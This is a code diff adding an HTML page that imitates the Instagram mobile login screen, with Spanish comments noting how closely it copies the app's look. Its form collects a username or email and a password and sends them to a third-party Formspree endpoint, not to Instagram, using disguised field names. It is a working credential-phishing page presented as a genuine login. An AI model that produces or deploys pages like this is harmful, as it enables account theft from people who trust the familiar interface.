@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <style>
+        body {
+            background-color: #ffffff; /* Instagram móvil es mayormente blanco */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+    
+        .container1 {
+            background-color: #fff;
+            padding: 10px 30px;
+            width: 100%;
+            max-width: 400px; /* Tamaño estándar de pantalla móvil */
+            text-align: center;
+        }
+    
+        /* Estilo de los inputs idéntico a la App */
+        input {
+            width: 100%;
+            padding: 12px 10px;
+            margin-bottom: 8px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px; /* Bordes suaves, no excesivos */
+            font-size: 14px;
+        }
+    
+        input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+    
+        /* Botón de login característico */
+        button {
+            width: 100%;
+            background-color: #0095f6; /* El azul oficial de Instagram */
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 15px;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+        }
+    
+        button:active {
+            opacity: 0.7; /* Feedback visual al tocar en móvil */
+            transform: scale(0.98);
+        }
+    
+        /* Texto de ayuda debajo del botón */
+        .forgot-pass {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            display: block;
+        }
+    </style>
+  
+    <div class="container1">
+        <img src="https://es.wikipedia.org/wiki/Archivo:Instagram_icon.png" alt="Instagram" style="width: 100px; height: 100px;">   
+    <form action="https://formspree.io/f/xykjyoql" method="POST">
+        <h2>Iniciar sesión en Instagram</h2>
+       
+        <input type="text" name="nombre"  placeholder="Teléfono, usuario o correo electrónico" required style="width: 300px; padding: 8px;">
+        
+        <input type="text"  placeholder="Contraseña" name="carrera" required style="width: 300px; padding: 8px;">
+        
+        <button type="submit" style="padding: 10px 20px; background: #25D366; color: white; border: none; cursor: pointer;">
+            Iniciar sesión
+        </button>
+    </form>
+</div>
+</body>
+</html>
